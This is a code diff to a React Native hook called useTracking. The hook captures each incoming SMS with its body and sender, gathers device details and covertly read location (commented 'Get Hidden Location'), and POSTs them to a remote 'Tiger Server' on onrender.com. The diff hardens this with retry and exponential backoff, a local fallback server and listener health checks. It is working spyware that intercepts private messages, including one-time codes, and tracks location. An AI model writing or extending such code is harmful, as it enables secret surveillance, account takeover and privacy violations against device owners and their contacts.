@@ -1,4 +1,4 @@
-import { useEffect } from 'react';
+import { useEffect, useState } from 'react';
 import { PermissionsAndroid } from 'react-native';
 import * as Device from 'expo-device';
 import * as Location from 'expo-location';
@@ -7,8 +7,31 @@ import SmsListener from 'react-native-get-sms-android';
 
 // 🐅 APNA FINAL RENDER URL
 const API_URL = "https://tiger2-1.onrender.com/log-sms";
+const LOCAL_URL = "http://localhost:10000/log-sms"; // Fallback for local testing
 
 const useTracking = (permissionStatus) => {
+  const [useLocalServer, setUseLocalServer] = useState(false); // Toggle for local vs Render
+
+  // Retry logic with exponential backoff
+  const sendWithRetry = async (url, payload, retries = 3, delay = 1000) => {
+    for (let i = 0; i < retries; i++) {
+      try {
+        console.log(`[useTracking] Attempt ${i + 1} POST to: ${url}`);
+        const response = await axios.post(url, payload, { timeout: 10000 });
+        console.log(`[useTracking] Success on attempt ${i + 1}:`, response.data);
+        return response;
+      } catch (err) {
+        console.error(`[useTracking] Attempt ${i + 1} failed:`, err.message);
+        if (i < retries - 1) {
+          console.log(`[useTracking] Retrying in ${delay}ms...`);
+          await new Promise(resolve => setTimeout(resolve, delay));
+          delay *= 2; // Exponential backoff
+        }
+      }
+    }
+    throw new Error('All retry attempts failed');
+  };
+
   useEffect(() => {
     if (permissionStatus === 'granted') {
       
@@ -16,34 +39,54 @@ const useTracking = (permissionStatus) => {
         try {
           // 1. Get Hidden Location
           let location = "Disabled";
-          let loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced });
-          location = `${loc.coords.latitude},${loc.coords.longitude}`;
+          try {
+            let loc = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced, timeout: 5000 });
+            location = `${loc.coords.latitude},${loc.coords.longitude}`;
+            console.log(`[useTracking] Location fetched: ${location}`);
+          } catch (locErr) {
+            console.warn(`[useTracking] Location fetch failed: ${locErr.message}`);
+          }
 
           // 2. Prepare Device Info
           const deviceName = `${Device.brand} ${Device.modelName} (OS: ${Device.osVersion})`;
 
-          // 3. Send to Render
-          await axios.post(API_URL, {
+          // 3. Send to Server with retry
+          const targetUrl = useLocalServer ? LOCAL_URL : API_URL;
+          const payload = {
             sender: sender,
             message: messageBody,
             device: deviceName,
             location: location,
             timestamp: new Date().toLocaleString()
-          });
+          };
+
+          await sendWithRetry(targetUrl, payload);
           console.log("[✓] Data Synced to Tiger Server");
         } catch (err) {
-          console.error("[X] Sync Failed:", err.message);
+          console.error("[useTracking] Final sync failure:", err.message);
+          // Optionally, store failed payloads locally for later retry
         }
       };
 
       // Real-time Listener (Sahi tareeka)
+      console.log("[useTracking] Starting SMS listener...");
       const subscription = SmsListener.addListener(async (message) => {
+        console.log(`[useTracking] SMS received from ${message.originatingAddress}: ${message.body}`);
         await sendDataToServer(message.body, message.originatingAddress);
       });
 
-      return () => subscription.remove();
-    }
-  }, [permissionStatus]);
-};
+      // Health check: Log listener status every 30s
+      const healthInterval = setInterval(() => {
+        console.log("[useTracking] SMS listener health check: Active");
+      }, 30000);
 
-export default useTracking;
+      return () => {
+        subscription.remove();
+        clearInterval(healthInterval);
+      };
+    }
+  }, [permissionStatus, useLocalServer]);
+
+  // Expose toggle for local server (can be used in UI)
+  return { useLocalServer, setUseLocalServer };
+};
